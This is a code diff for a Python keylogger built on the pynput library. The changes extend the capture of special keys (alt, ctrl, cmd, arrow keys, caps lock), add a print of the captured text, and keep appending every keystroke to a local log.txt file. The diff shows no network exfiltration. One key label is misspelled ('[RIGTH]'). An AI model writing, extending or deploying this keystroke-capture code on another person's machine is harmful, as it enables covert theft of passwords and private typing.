@@ -1,5 +1,6 @@
 from pynput import keyboard
 
+
 maxChar = 5
 maxSpaces = 10
 nspaces = 0
@@ -22,7 +23,25 @@ def switch(var):
     if var == keyboard.Key.esc:
         return "[ESC]"
     if var == keyboard.Key.shift:
-        return "[SHIFT]"
+        return "[SHIFT]" 
+    if var == keyboard.Key.alt:
+        return "[ALT]" 
+    if var == keyboard.Key.alt_gr:
+        return "[ALT_GR]" 
+    if var == keyboard.Key.cmd:
+        return "[CMD]" 
+    if var == keyboard.Key.caps_lock:
+        return "[CAPS_LOCK]" 
+    if var == keyboard.Key.ctrl:
+        return "[CTRL]"
+    if var == keyboard.Key.down:
+        return "[DOWN]"
+    if var == keyboard.Key.up:
+        return "[UP]"
+    if var == keyboard.Key.right:
+        return "[RIGTH]"
+    if var == keyboard.Key.left:
+        return "[LEFT]"
     if var == keyboard.Key.enter:
         return "\n"
 
@@ -36,10 +55,19 @@ def on_press(key):
     specialchar = ""
     special = False
 
-    if key == keyboard.Key.esc or \
+    if key == keyboard.Key.alt_gr or \
+       key == keyboard.Key.alt or \
+       key == keyboard.Key.esc or \
        key == keyboard.Key.space or \
        key == keyboard.Key.tab or \
-       key == keyboard.Key.shift:
+       key == keyboard.Key.shift or \
+       key == keyboard.Key.left or \
+       key == keyboard.Key.right or \
+       key == keyboard.Key.up or \
+       key == keyboard.Key.down or \
+       key == keyboard.Key.ctrl or \
+       key == keyboard.Key.caps_lock or \
+       key == keyboard.Key.cmd:
         special = True
         specialchar = switch(key)
     else:
@@ -54,6 +82,8 @@ def on_press(key):
             text = text + key.char
     except:
         text = text + "[SPECIAL_CHAR]"
+
+    print(text)
 
     with open('log.txt', 'a') as f:
         f.write(text)
